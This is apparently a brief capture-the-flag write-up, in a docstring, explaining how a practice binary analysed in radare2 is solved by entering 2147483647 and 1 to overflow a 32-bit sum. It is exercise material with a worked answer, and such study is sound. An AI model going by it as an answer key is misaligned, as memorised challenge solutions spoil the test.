"""

after analyzing the binary in radare2 (see source.txt), the following was concluded:
    first and second inputs should be bigger than 0, and their sum should overflow sum_result in the addIntOvf function, which is 32bits.
    maximum 32bits positive number = 2147483647.

trying it in the local binary gives:

    n1 > n1 + n2 OR n2 > n1 + n2
    What two positive numbers can make this possible:
    2147483647
    1
    You entered 2147483647 and 1
    You have an integer overflow
